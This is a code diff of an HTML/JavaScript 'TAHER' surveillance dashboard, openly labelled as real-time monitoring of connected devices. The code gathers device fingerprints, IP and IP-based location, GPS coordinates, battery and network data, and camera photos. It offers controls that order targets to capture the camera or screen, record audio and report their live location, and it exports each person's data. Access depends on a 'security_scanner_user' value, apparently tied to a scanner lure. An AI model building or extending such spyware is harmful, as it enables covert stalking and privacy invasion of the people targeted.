@@ -1,462 +1,602 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>👑 TAHER - Live Monitoring Dashboard</title>
+    <title>👑 TAHER - Master Dashboard</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: monospace;
-        }
-        
-        body {
-            background: #000;
-            color: #0f0;
-            padding: 20px;
-        }
-        
-        .header {
-            border-bottom: 2px solid #0f0;
-            padding: 20px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .stats {
-            display: flex;
-            gap: 20px;
-        }
-        
-        .stat-box {
-            background: #111;
-            padding: 15px;
-            border: 1px solid #0f0;
-            border-radius: 5px;
-            text-align: center;
-            min-width: 150px;
-        }
-        
-        .stat-value {
-            font-size: 24px;
-            font-weight: bold;
-            color: #0f0;
-        }
-        
-        .dashboard {
-            display: grid;
-            grid-template-columns: 300px 1fr;
-            gap: 20px;
-            height: 80vh;
-        }
-        
-        .panel {
-            border: 1px solid #0f0;
-            border-radius: 5px;
-            overflow: hidden;
-        }
-        
-        .panel-header {
-            background: #111;
-            padding: 15px;
-            border-bottom: 1px solid #0f0;
-            font-weight: bold;
-        }
-        
-        .panel-content {
-            padding: 15px;
-            height: calc(100% - 50px);
-            overflow-y: auto;
-        }
-        
-        .user-item {
-            padding: 10px;
-            margin: 5px 0;
-            background: #111;
-            border: 1px solid #333;
-            cursor: pointer;
-        }
-        
-        .user-item:hover {
-            border-color: #0f0;
-            background: #222;
-        }
-        
-        .user-active {
-            border-left: 4px solid #0f0;
-        }
-        
-        .log-item {
-            padding: 8px;
-            margin: 5px 0;
-            background: #111;
-            border-left: 3px solid #0f0;
-            font-size: 12px;
-        }
-        
-        .log-camera {
-            border-left-color: #ff0;
-        }
-        
-        .log-location {
-            border-left-color: #0ff;
-        }
-        
-        .log-audio {
-            border-left-color: #f0f;
-        }
-        
-        .camera-view {
-            width: 100%;
-            height: 200px;
-            background: #000;
-            margin: 10px 0;
-            border: 1px solid #0f0;
-        }
-        
-        button {
-            background: #0f0;
-            color: #000;
-            border: none;
-            padding: 10px;
-            margin: 5px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        
-        button:hover {
-            background: #0c0;
-        }
-        
-        button.red {
-            background: #f00;
-            color: #fff;
-        }
-        
-        .photo-preview {
-            max-width: 100%;
-            max-height: 150px;
-            border: 1px solid #0f0;
-            margin: 5px 0;
-        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:monospace;}
+        body{background:#000;color:#0f0;padding:20px;}
+        .header{border-bottom:2px solid #0f0;padding:20px;margin-bottom:20px;}
+        .stats{display:flex;gap:20px;flex-wrap:wrap;margin:20px 0;}
+        .stat{background:#111;border:1px solid #0f0;padding:15px;border-radius:5px;min-width:150px;}
+        .stat-value{font-size:24px;color:#0f0;font-weight:bold;}
+        .dashboard{display:grid;grid-template-columns:300px 1fr;gap:20px;height:85vh;}
+        .panel{border:1px solid #0f0;border-radius:5px;overflow:hidden;}
+        .panel-header{background:#111;padding:15px;border-bottom:1px solid #0f0;font-weight:bold;}
+        .panel-content{padding:15px;height:calc(100% - 50px);overflow-y:auto;}
+        .user-item{padding:10px;margin:5px 0;background:#111;border:1px solid #333;cursor:pointer;}
+        .user-item:hover{border-color:#0f0;background:#222;}
+        .user-active{border-left:4px solid #0f0;}
+        .detail-item{margin:10px 0;padding:10px;background:#111;border-left:3px solid #0f0;}
+        .detail-label{color:#0ff;font-weight:bold;}
+        .map{width:100%;height:200px;background:#111;border:1px solid #0f0;margin:10px 0;position:relative;}
+        .location-dot{position:absolute;width:12px;height:12px;background:#f00;border-radius:50%;transform:translate(-50%,-50%);}
+        button{background:#0f0;color:#000;border:none;padding:10px;margin:5px;cursor:pointer;font-weight:bold;}
+        button:hover{background:#0c0;}
+        .red{background:#f00;color:#fff;}
+        .yellow{background:#ff0;color:#000;}
+        .connection{border-left-color:#ff0;}
+        .battery{border-left-color:#0ff;}
+        .location{border-left-color:#f0f;}
+        .device{border-left-color:#ff8800;}
+        .hidden{display:none;}
+        .live-cam{width:100%;max-height:200px;object-fit:cover;border:1px solid #0f0;margin:5px 0;}
+        .network-bar{height:10px;background:#333;border-radius:5px;margin:5px 0;overflow:hidden;}
+        .network-fill{height:100%;background:#0f0;}
+        .battery-bar{height:15px;background:#333;border-radius:3px;margin:5px 0;overflow:hidden;}
+        .battery-fill{height:100%;background:#0f0;}
+        .timestamp{color:#888;font-size:12px;}
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>👑 TAHER - LIVE SURVEILLANCE DASHBOARD</h1>
-        <div class="stats">
-            <div class="stat-box">
-                <div class="stat-value" id="totalUsers">0</div>
-                <div>TOTAL USERS</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-value" id="activeUsers">0</div>
-                <div>ACTIVE NOW</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-value" id="totalPhotos">0</div>
-                <div>PHOTOS CAPTURED</div>
-            </div>
-        </div>
+        <h1>👑 TAHER MASTER CONTROL DASHBOARD</h1>
+        <div>Real-time surveillance of all connected devices</div>
+    </div>
+    
+    <div class="stats">
+        <div class="stat"><div class="stat-value" id="totalUsers">0</div><div>TOTAL USERS</div></div>
+        <div class="stat"><div class="stat-value" id="onlineUsers">0</div><div>ONLINE NOW</div></div>
+        <div class="stat"><div class="stat-value" id="totalPhotos">0</div><div>PHOTOS</div></div>
+        <div class="stat"><div class="stat-value" id="totalLocations">0</div><div>LOCATIONS</div></div>
+        <div class="stat"><div class="stat-value" id="avgBattery">0%</div><div>AVG BATTERY</div></div>
     </div>
     
     <div class="dashboard">
         <!-- LEFT: USER LIST -->
         <div class="panel">
-            <div class="panel-header">👥 CONNECTED USERS</div>
-            <div class="panel-content" id="userList">
-                <!-- Users will load here -->
-            </div>
+            <div class="panel-header">📱 CONNECTED DEVICES</div>
+            <div class="panel-content" id="userList"></div>
         </div>
         
-        <!-- RIGHT: LIVE MONITORING -->
+        <!-- RIGHT: DETAILED VIEW -->
         <div class="panel">
             <div class="panel-header">
-                📡 LIVE MONITORING - <span id="selectedUser">Select a user</span>
+                🔍 LIVE MONITORING - <span id="selectedUser">Select Device</span>
             </div>
             <div class="panel-content">
-                <div id="userDetails">
-                    <p>Select a user from the left to view their live data</p>
+                <div id="deviceDetails">
+                    <p>Select a device to view detailed information</p>
                 </div>
                 
-                <div id="cameraSection" style="display: none;">
-                    <h3>📷 Camera Feed</h3>
-                    <div class="camera-view" id="cameraView">
-                        <!-- Camera feed will appear here -->
+                <div id="liveData" class="hidden">
+                    <!-- DEVICE INFO -->
+                    <div class="detail-item device">
+                        <div class="detail-label">📱 DEVICE INFORMATION</div>
+                        <div id="deviceInfo">Loading...</div>
                     </div>
-                    <button onclick="forceCamera()">📸 FORCE CAPTURE NOW</button>
-                </div>
-                
-                <div id="locationSection" style="display: none; margin-top: 20px;">
-                    <h3>📍 Location Data</h3>
-                    <div id="locationData">Loading...</div>
-                </div>
-                
-                <div id="photoSection" style="display: none; margin-top: 20px;">
-                    <h3>📸 Captured Photos</h3>
-                    <div id="photoGallery"></div>
-                </div>
-                
-                <div style="margin-top: 30px;">
-                    <button onclick="exportAllData()" class="red">💾 EXPORT ALL DATA</button>
-                    <button onclick="clearAllData()" class="red">💥 DELETE ALL DATA</button>
-                    <button onclick="refreshData()">🔄 REFRESH</button>
+                    
+                    <!-- NETWORK -->
+                    <div class="detail-item connection">
+                        <div class="detail-label">🌐 NETWORK CONNECTION</div>
+                        <div id="networkInfo">Loading...</div>
+                        <div class="network-bar"><div id="networkSpeedBar" class="network-fill" style="width:0%"></div></div>
+                    </div>
+                    
+                    <!-- BATTERY -->
+                    <div class="detail-item battery">
+                        <div class="detail-label">🔋 BATTERY STATUS</div>
+                        <div id="batteryInfo">Loading...</div>
+                        <div class="battery-bar"><div id="batteryLevelBar" class="battery-fill" style="width:0%"></div></div>
+                    </div>
+                    
+                    <!-- LOCATION -->
+                    <div class="detail-item location">
+                        <div class="detail-label">📍 LIVE LOCATION</div>
+                        <div id="locationInfo">Loading...</div>
+                        <div class="map" id="mapContainer">
+                            <div class="location-dot" id="locationDot" style="top:50%;left:50%;"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- CAMERA -->
+                    <div id="cameraSection" class="hidden">
+                        <div class="detail-label">📷 LIVE CAMERA CAPTURE</div>
+                        <img id="liveCamera" class="live-cam" src="" alt="Camera feed">
+                        <div class="timestamp" id="photoTime"></div>
+                    </div>
+                    
+                    <!-- ACTIONS -->
+                    <div style="margin-top:20px;">
+                        <button onclick="forceCapture()" class="yellow">📸 CAPTURE NOW</button>
+                        <button onclick="getLiveLocation()" class="yellow">📍 UPDATE LOCATION</button>
+                        <button onclick="exportUserData()">💾 EXPORT DATA</button>
+                        <button onclick="sendCommand('SCREEN_CAPTURE')" class="yellow">🖥️ CAPTURE SCREEN</button>
+                        <button onclick="sendCommand('START_RECORDING')" class="red">🎤 RECORD AUDIO</button>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 
-    <script>
-    // ============================================
-    // GLOBAL VARIABLES
-    // ============================================
-    let allUsers = {};
-    let selectedUser = null;
-    let refreshInterval = null;
-    
-    // ============================================
-    // LOAD ALL USER DATA
-    // ============================================
-    function loadAllUsers() {
-        const usersData = localStorage.getItem('all_users');
-        if (usersData) {
-            allUsers = JSON.parse(usersData);
-            updateDashboard();
-        }
+<script>
+// ============================================
+// GLOBAL VARIABLES
+// ============================================
+let allDevices = {};
+let selectedDevice = null;
+let refreshInterval = null;
+
+// ============================================
+// DEVICE DATA COLLECTION
+// ============================================
+function collectDeviceData(username) {
+    const deviceData = {
+        timestamp: Date.now(),
+        username: username,
         
-        // Also check for individual user data
-        const userKeys = Object.keys(localStorage).filter(key => key.startsWith('user_'));
-        userKeys.forEach(key => {
-            const userData = JSON.parse(localStorage.getItem(key));
-            if (userData && userData.username) {
-                allUsers[userData.username] = userData;
-            }
+        // Device Information
+        device: {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor || 'Unknown',
+            deviceType: getDeviceType(),
+            screen: `${screen.width}x${screen.height}`,
+            pixelRatio: window.devicePixelRatio,
+            colorDepth: `${screen.colorDepth} bit`,
+            orientation: screen.orientation?.type || 'Unknown',
+            touchPoints: navigator.maxTouchPoints,
+            hardwareCores: navigator.hardwareConcurrency || 'Unknown',
+            deviceMemory: navigator.deviceMemory || 'Unknown'
+        },
+        
+        // Browser Detection
+        browser: {
+            name: getBrowserName(),
+            version: getBrowserVersion(),
+            engine: getBrowserEngine(),
+            language: navigator.language,
+            cookies: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'Disabled'
+        },
+        
+        // Network Information
+        network: {
+            type: 'Checking...',
+            downlink: 0,
+            effectiveType: 'Unknown',
+            rtt: 0,
+            ip: 'Fetching...'
+        },
+        
+        // Battery Status
+        battery: {
+            level: 0,
+            charging: false,
+            chargingTime: 0,
+            dischargingTime: 0
+        },
+        
+        // Location Data
+        location: {
+            lat: null,
+            lng: null,
+            accuracy: 0,
+            address: 'Unknown',
+            timestamp: null
+        },
+        
+        // Camera Status
+        camera: {
+            hasCamera: false,
+            lastCapture: null,
+            photo: null
+        }
+    };
+    
+    // Get Network Info
+    if (navigator.connection) {
+        const conn = navigator.connection;
+        deviceData.network = {
+            type: conn.type || 'Unknown',
+            downlink: conn.downlink || 0,
+            effectiveType: conn.effectiveType || 'Unknown',
+            rtt: conn.rtt || 0,
+            saveData: conn.saveData || false
+        };
+    }
+    
+    // Get Battery Info
+    if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+            deviceData.battery = {
+                level: Math.round(battery.level * 100),
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
         });
     }
     
-    // ============================================
-    // UPDATE DASHBOARD DISPLAY
-    // ============================================
-    function updateDashboard() {
-        const userList = document.getElementById('userList');
-        const totalUsers = Object.keys(allUsers).length;
-        
-        document.getElementById('totalUsers').textContent = totalUsers;
-        
-        // Calculate active users (last 5 minutes)
-        const now = Date.now();
-        let activeCount = 0;
-        let photoCount = 0;
-        
-        userList.innerHTML = '';
-        
-        Object.entries(allUsers).forEach(([username, data]) => {
-            const time = new Date(data.timestamp).getTime();
-            const isActive = (now - time) < 300000; // 5 minutes
-            if (isActive) activeCount++;
-            
-            // Count photos
-            if (data.data?.photo) photoCount++;
-            
-            const userDiv = document.createElement('div');
-            userDiv.className = `user-item ${selectedUser === username ? 'user-active' : ''}`;
-            userDiv.innerHTML = `
-                <strong>${username}</strong> ${data.isAdmin ? '👑' : ''}
-                <br>
-                <small>${data.data?.device?.platform || 'Unknown device'}</small>
-                <br>
-                <small>${isActive ? '🟢 ONLINE' : '🔴 OFFLINE'} - ${new Date(data.timestamp).toLocaleTimeString()}</small>
-            `;
-            
-            userDiv.onclick = () => selectUser(username);
-            userList.appendChild(userDiv);
+    // Get IP Address
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+            deviceData.network.ip = data.ip;
+            // Get location from IP
+            fetch(`https://ipapi.co/${data.ip}/json/`)
+                .then(res => res.json())
+                .then(ipData => {
+                    deviceData.location.ipBased = {
+                        city: ipData.city,
+                        region: ipData.region,
+                        country: ipData.country_name,
+                        isp: ipData.org,
+                        timezone: ipData.timezone
+                    };
+                });
         });
-        
-        document.getElementById('activeUsers').textContent = activeCount;
-        document.getElementById('totalPhotos').textContent = photoCount;
-        
-        // Auto-refresh every 3 seconds
-        if (!refreshInterval) {
-            refreshInterval = setInterval(loadAllUsers, 3000);
-        }
+    
+    // Try to get GPS location
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+            deviceData.location = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: position.timestamp
+            };
+        });
     }
     
-    // ============================================
-    // SELECT USER FOR DETAILED VIEW
-    // ============================================
-    function selectUser(username) {
-        selectedUser = username;
+    // Check camera
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+        navigator.mediaDevices.enumerateDevices().then(devices => {
+            deviceData.camera.hasCamera = devices.some(device => device.kind === 'videoinput');
+        });
+    }
+    
+    return deviceData;
+}
+
+// ============================================
+// HELPER FUNCTIONS
+// ============================================
+function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/mobile/i.test(ua)) return 'Mobile';
+    if (/tablet/i.test(ua)) return 'Tablet';
+    return 'Desktop';
+}
+
+function getBrowserName() {
+    const ua = navigator.userAgent;
+    if (/chrome/i.test(ua) && !/edge/i.test(ua)) return 'Chrome';
+    if (/firefox/i.test(ua)) return 'Firefox';
+    if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
+    if (/edge/i.test(ua)) return 'Edge';
+    if (/opera/i.test(ua)) return 'Opera';
+    if (/trident/i.test(ua)) return 'Internet Explorer';
+    return 'Unknown';
+}
+
+function getBrowserVersion() {
+    const ua = navigator.userAgent;
+    const match = ua.match(/(chrome|firefox|safari|edge|opera|version|rv)[\s\/:]([\w\d\.]+)/i);
+    return match ? match[2] : 'Unknown';
+}
+
+function getBrowserEngine() {
+    const ua = navigator.userAgent;
+    if (/applewebkit/i.test(ua)) return 'WebKit';
+    if (/gecko/i.test(ua)) return 'Gecko';
+    if (/trident/i.test(ua)) return 'Trident';
+    if (/edgehtml/i.test(ua)) return 'EdgeHTML';
+    if (/blink/i.test(ua)) return 'Blink';
+    return 'Unknown';
+}
+
+// ============================================
+// DASHBOARD FUNCTIONS
+// ============================================
+function loadAllDevices() {
+    // Load from localStorage
+    const devicesData = localStorage.getItem('all_devices');
+    if (devicesData) {
+        allDevices = JSON.parse(devicesData);
         updateDashboard();
+    }
+    
+    // Also check for individual device data
+    const deviceKeys = Object.keys(localStorage).filter(key => key.startsWith('device_'));
+    deviceKeys.forEach(key => {
+        try {
+            const deviceData = JSON.parse(localStorage.getItem(key));
+            if (deviceData && deviceData.username) {
+                allDevices[deviceData.username] = deviceData;
+            }
+        } catch (e) {}
+    });
+}
+
+function updateDashboard() {
+    const userList = document.getElementById('userList');
+    const totalUsers = Object.keys(allDevices).length;
+    
+    document.getElementById('totalUsers').textContent = totalUsers;
+    
+    // Calculate stats
+    const now = Date.now();
+    let onlineCount = 0;
+    let photoCount = 0;
+    let locationCount = 0;
+    let totalBattery = 0;
+    let batteryCount = 0;
+    
+    userList.innerHTML = '';
+    
+    Object.entries(allDevices).forEach(([username, data]) => {
+        // Check if online (last 2 minutes)
+        const isOnline = (now - data.timestamp) < 120000;
+        if (isOnline) onlineCount++;
         
-        const userData = allUsers[username];
-        if (!userData) return;
+        // Count photos
+        if (data.camera?.photo) photoCount++;
         
-        document.getElementById('selectedUser').textContent = username;
+        // Count locations
+        if (data.location?.lat) locationCount++;
         
-        // Update user details
-        const detailsDiv = document.getElementById('userDetails');
-        detailsDiv.innerHTML = `
-            <h3>👤 ${username} ${userData.isAdmin ? '(ADMIN)' : ''}</h3>
-            <p><strong>Device:</strong> ${userData.data?.device?.userAgent?.substring(0, 50)}...</p>
-            <p><strong>Screen:</strong> ${userData.data?.device?.screen || 'Unknown'}</p>
-            <p><strong>Language:</strong> ${userData.data?.device?.language || 'Unknown'}</p>
-            <p><strong>Last Active:</strong> ${new Date(userData.timestamp).toLocaleString()}</p>
+        // Battery stats
+        if (data.battery?.level) {
+            totalBattery += data.battery.level;
+            batteryCount++;
+        }
+        
+        // Create user item
+        const userDiv = document.createElement('div');
+        userDiv.className = `user-item ${selectedDevice === username ? 'user-active' : ''}`;
+        
+        const deviceName = data.device?.deviceType || 'Unknown';
+        const batteryLevel = data.battery?.level ? `${data.battery.level}%` : '?%';
+        const networkType = data.network?.type || 'Unknown';
+        
+        userDiv.innerHTML = `
+            <strong>${username}</strong>
+            <div style="font-size:12px;color:#0ff;">
+                📱 ${deviceName} | 🔋 ${batteryLevel} | 📶 ${networkType}
+            </div>
+            <div style="font-size:10px;color:#888;">
+                ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'} | 
+                ${new Date(data.timestamp).toLocaleTimeString()}
+            </div>
         `;
         
-        // Show camera section if photo exists
-        if (userData.data?.photo) {
-            document.getElementById('cameraSection').style.display = 'block';
-            document.getElementById('photoSection').style.display = 'block';
-            
-            const photoGallery = document.getElementById('photoGallery');
-            photoGallery.innerHTML = `
-                <img src="${userData.data.photo}" class="photo-preview" onclick="showFullPhoto('${userData.data.photo}')">
-                <p>Photo captured at ${new Date(userData.timestamp).toLocaleTimeString()}</p>
+        userDiv.onclick = () => selectDevice(username);
+        userList.appendChild(userDiv);
+    });
+    
+    document.getElementById('onlineUsers').textContent = onlineCount;
+    document.getElementById('totalPhotos').textContent = photoCount;
+    document.getElementById('totalLocations').textContent = locationCount;
+    
+    const avgBattery = batteryCount > 0 ? Math.round(totalBattery / batteryCount) : 0;
+    document.getElementById('avgBattery').textContent = `${avgBattery}%`;
+    
+    // Auto-refresh
+    if (!refreshInterval) {
+        refreshInterval = setInterval(loadAllDevices, 3000);
+    }
+}
+
+function selectDevice(username) {
+    selectedDevice = username;
+    updateDashboard();
+    
+    const deviceData = allDevices[username];
+    if (!deviceData) return;
+    
+    document.getElementById('selectedUser').textContent = username;
+    document.getElementById('liveData').classList.remove('hidden');
+    
+    // Update device info
+    const deviceInfo = document.getElementById('deviceInfo');
+    if (deviceData.device) {
+        deviceInfo.innerHTML = `
+            <div>Model: ${deviceData.device.platform}</div>
+            <div>Type: ${deviceData.device.deviceType}</div>
+            <div>Screen: ${deviceData.device.screen} @ ${deviceData.device.pixelRatio}x</div>
+            <div>Cores: ${deviceData.device.hardwareCores} | RAM: ${deviceData.device.deviceMemory}GB</div>
+            <div>Touch Points: ${deviceData.device.touchPoints}</div>
+        `;
+    }
+    
+    // Update network info
+    const networkInfo = document.getElementById('networkInfo');
+    const networkBar = document.getElementById('networkSpeedBar');
+    if (deviceData.network) {
+        const speed = deviceData.network.downlink || 0;
+        networkInfo.innerHTML = `
+            <div>IP: ${deviceData.network.ip || 'Unknown'}</div>
+            <div>Type: ${deviceData.network.type}</div>
+            <div>Speed: ${speed} Mbps</div>
+            <div>Effective: ${deviceData.network.effectiveType}</div>
+            <div>RTT: ${deviceData.network.rtt}ms</div>
+            <div>Data Saver: ${deviceData.network.saveData ? 'On' : 'Off'}</div>
+        `;
+        networkBar.style.width = `${Math.min(speed * 10, 100)}%`;
+    }
+    
+    // Update battery info
+    const batteryInfo = document.getElementById('batteryInfo');
+    const batteryBar = document.getElementById('batteryLevelBar');
+    if (deviceData.battery) {
+        batteryInfo.innerHTML = `
+            <div>Level: ${deviceData.battery.level}%</div>
+            <div>Charging: ${deviceData.battery.charging ? 'Yes ⚡' : 'No'}</div>
+            <div>Time to full: ${deviceData.battery.chargingTime || 'Unknown'}</div>
+            <div>Time to empty: ${deviceData.battery.dischargingTime || 'Unknown'}</div>
+        `;
+        batteryBar.style.width = `${deviceData.battery.level}%`;
+        batteryBar.style.background = deviceData.battery.charging ? '#0ff' : '#0f0';
+    }
+    
+    // Update location info
+    const locationInfo = document.getElementById('locationInfo');
+    const mapDot = document.getElementById('locationDot');
+    if (deviceData.location?.lat) {
+        locationInfo.innerHTML = `
+            <div>📍 ${deviceData.location.lat.toFixed(6)}, ${deviceData.location.lng.toFixed(6)}</div>
+            <div>Accuracy: ${deviceData.location.accuracy}m</div>
+            <div>Altitude: ${deviceData.location.altitude || 'N/A'}</div>
+            <div>Speed: ${deviceData.location.speed || '0'} m/s</div>
+            <div>Heading: ${deviceData.location.heading || '0'}°</div>
+        `;
+        
+        // Simulate map position
+        const lat = (deviceData.location.lat + 90) / 180 * 100;
+        const lng = (deviceData.location.lng + 180) / 360 * 100;
+        mapDot.style.top = `${lat}%`;
+        mapDot.style.left = `${lng}%`;
+        
+        // Add IP location if available
+        if (deviceData.location.ipBased) {
+            locationInfo.innerHTML += `
+                <div>IP Location: ${deviceData.location.ipBased.city}, ${deviceData.location.ipBased.country}</div>
+                <div>ISP: ${deviceData.location.ipBased.isp}</div>
+                <div>Timezone: ${deviceData.location.ipBased.timezone}</div>
             `;
-        } else {
-            document.getElementById('cameraSection').style.display = 'none';
-            document.getElementById('photoSection').style.display = 'none';
         }
-        
-        // Show location data
-        if (userData.data?.location) {
-            document.getElementById('locationSection').style.display = 'block';
-            const loc = userData.data.location;
-            if (loc.lat) {
-                document.getElementById('locationData').innerHTML = `
-                    <p><strong>Latitude:</strong> ${loc.lat}</p>
-                    <p><strong>Longitude:</strong> ${loc.lng}</p>
-                    <p><strong>Accuracy:</strong> ${loc.accuracy} meters</p>
-                    <a href="https://maps.google.com/?q=${loc.lat},${loc.lng}" target="_blank" style="color:#0ff;">
-                        📍 View on Google Maps
-                    </a>
-                `;
-            } else {
-                document.getElementById('locationData').innerHTML = 
-                    `<p style="color:#f00;">Location access denied: ${loc.error}</p>`;
-            }
-        } else {
-            document.getElementById('locationSection').style.display = 'none';
-        }
+    } else {
+        locationInfo.innerHTML = `<div style="color:#f00;">Location not available</div>`;
     }
     
-    // ============================================
-    // CONTROL FUNCTIONS
-    // ============================================
-    function forceCamera() {
-        if (!selectedUser) {
-            alert('Select a user first!');
-            return;
-        }
-        
-        // Save command to localStorage
-        const command = {
-            type: 'FORCE_CAMERA',
-            user: selectedUser,
-            timestamp: Date.now()
-        };
-        
-        localStorage.setItem(`command_${selectedUser}`, JSON.stringify(command));
-        alert(`Command sent to ${selectedUser}. They will capture photo on next scan.`);
+    // Update camera section
+    const cameraSection = document.getElementById('cameraSection');
+    const liveCamera = document.getElementById('liveCamera');
+    const photoTime = document.getElementById('photoTime');
+    
+    if (deviceData.camera?.photo) {
+        cameraSection.classList.remove('hidden');
+        liveCamera.src = deviceData.camera.photo;
+        photoTime.textContent = `Last capture: ${new Date(deviceData.camera.lastCapture).toLocaleString()}`;
+    } else {
+        cameraSection.classList.add('hidden');
+    }
+}
+
+// ============================================
+// CONTROL FUNCTIONS
+// ============================================
+function forceCapture() {
+    if (!selectedDevice) return alert('Select a device first!');
+    
+    const command = {
+        type: 'FORCE_CAMERA_CAPTURE',
+        target: selectedDevice,
+        timestamp: Date.now()
+    };
+    
+    localStorage.setItem(`command_${selectedDevice}`, JSON.stringify(command));
+    alert(`Command sent to ${selectedDevice}`);
+}
+
+function getLiveLocation() {
+    if (!selectedDevice) return alert('Select a device first!');
+    
+    const command = {
+        type: 'GET_LIVE_LOCATION',
+        target: selectedDevice,
+        timestamp: Date.now()
+    };
+    
+    localStorage.setItem(`command_${selectedDevice}`, JSON.stringify(command));
+    alert(`Location request sent to ${selectedDevice}`);
+}
+
+function sendCommand(commandType) {
+    if (!selectedDevice) return alert('Select a device first!');
+    
+    const command = {
+        type: commandType,
+        target: selectedDevice,
+        timestamp: Date.now()
+    };
+    
+    localStorage.setItem(`command_${selectedDevice}`, JSON.stringify(command));
+    alert(`${commandType} command sent!`);
+}
+
+function exportUserData() {
+    if (!selectedDevice) return alert('Select a device first!');
+    
+    const deviceData = allDevices[selectedDevice];
+    const dataStr = JSON.stringify(deviceData, null, 2);
+    const dataUri = 'data:application/json;charset=utf-8,' + encodeURIComponent(dataStr);
+    
+    const link = document.createElement('a');
+    link.setAttribute('href', dataUri);
+    link.setAttribute('download', `device_${selectedDevice}_${Date.now()}.json`);
+    link.click();
+}
+
+// ============================================
+// INITIALIZATION
+// ============================================
+document.addEventListener('DOMContentLoaded', function() {
+    // Check if user is TAHER
+    const currentUser = localStorage.getItem('security_scanner_user');
+    if (currentUser?.toUpperCase() !== 'TAHER') {
+        alert('ACCESS DENIED: Only TAHER can access this dashboard!');
+        window.location.href = 'index.html';
+        return;
     }
     
-    function showFullPhoto(photoData) {
-        const win = window.open();
-        win.document.write(`<img src="${photoData}" style="max-width:100%;">`);
-    }
+    // Load device data
+    loadAllDevices();
     
-    function exportAllData() {
-        const dataStr = JSON.stringify(allUsers, null, 2);
-        const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
-        
-        const link = document.createElement('a');
-        link.setAttribute('href', dataUri);
-        link.setAttribute('download', `taher_surveillance_${Date.now()}.json`);
-        link.click();
-        
-        alert(`✅ Exported data for ${Object.keys(allUsers).length} users`);
-    }
+    // Auto-refresh every 3 seconds
+    setInterval(loadAllDevices, 3000);
     
-    function clearAllData() {
-        if (!confirm('💥 DELETE ALL DATA? This cannot be undone!')) return;
-        
-        // Clear all user data
-        Object.keys(localStorage).forEach(key => {
-            if (key.startsWith('user_') || key === 'all_users' || key.startsWith('command_')) {
-                localStorage.removeItem(key);
-            }
-        });
-        
-        allUsers = {};
-        updateDashboard();
-        
-        document.getElementById('userDetails').innerHTML = 
-            '<p>All data cleared. Waiting for new users...</p>';
-        
-        alert('✅ All data deleted!');
-    }
-    
-    function refreshData() {
-        loadAllUsers();
-        alert('🔄 Data refreshed!');
-    }
-    
-    // ============================================
-    // INITIALIZATION
-    // ============================================
-    document.addEventListener('DOMContentLoaded', function() {
-        console.log('👑 TAHER Dashboard Loaded');
-        
-        // Check if user is TAHER
-        const currentUser = localStorage.getItem('security_scanner_user');
-        if (currentUser?.toUpperCase() !== 'TAHER') {
-            alert('❌ ACCESS DENIED\nOnly TAHER can access this dashboard!');
-            window.location.href = 'index.html';
-            return;
+    // Auto-select first device
+    setTimeout(() => {
+        const firstDevice = Object.keys(allDevices)[0];
+        if (firstDevice && firstDevice.toUpperCase() !== 'TAHER') {
+            selectDevice(firstDevice);
         }
-        
-        // Load initial data
-        loadAllUsers();
-        
-        // Auto-refresh every 5 seconds
-        setInterval(loadAllUsers, 5000);
-        
-        // Welcome message
-        setTimeout(() => {
-            const firstUser = Object.keys(allUsers)[0];
-            if (firstUser && firstUser.toUpperCase() !== 'TAHER') {
-                selectUser(firstUser);
-            }
-        }, 1000);
-    });
+    }, 1000);
+});
+
+// ============================================
+// SIMULATE DEVICE CONNECTION (FOR TESTING)
+// ============================================
+function simulateNewDevice() {
+    const testDevices = [
+        { name: 'John iPhone', type: 'Mobile', battery: 85, network: '4G' },
+        { name: 'Sarah Laptop', type: 'Desktop', battery: 45, network: 'WiFi' },
+        { name: 'Mike Android', type: 'Mobile', battery: 20, network: '5G' }
+    ];
     
-    // ============================================
-    // KEYBOARD SHORTCUTS
-    // ============================================
-    document.addEventListener('keydown', function(e) {
-        // F5 to refresh
-        if (e.key === 'F5') {
-            e.preventDefault();
-            refreshData();
-        }
-        
-        // Ctrl+E to export
-        if (e.ctrlKey && e.key === 'e') {
-            e.preventDefault();
-            exportAllData();
-        }
-        
-        // Ctrl+D to delete
-        if (e.ctrlKey && e.key === 'd') {
-            e.preventDefault();
-            clearAllData();
-        }
-    });
+    const randomDevice = testDevices[Math.floor(Math.random() * testDevices.length)];
+    const deviceData = collectDeviceData(randomDevice.name);
     
-    </script>
+    // Save to localStorage
+    localStorage.setItem(`device_${randomDevice.name}`, JSON.stringify(deviceData));
+    
+    // Reload dashboard
+    loadAllDevices();
+}
+
+// Add test button (remove in production)
+document.body.innerHTML += `
+    <div style="position:fixed;bottom:10px;right:10px;">
+        <button onclick="simulateNewDevice()" style="background:#333;color:#fff;padding:5px;font-size:10px;">
+            🧪 SIMULATE DEVICE
+        </button>
+    </div>
+`;
+</script>
 </body>
 </html>
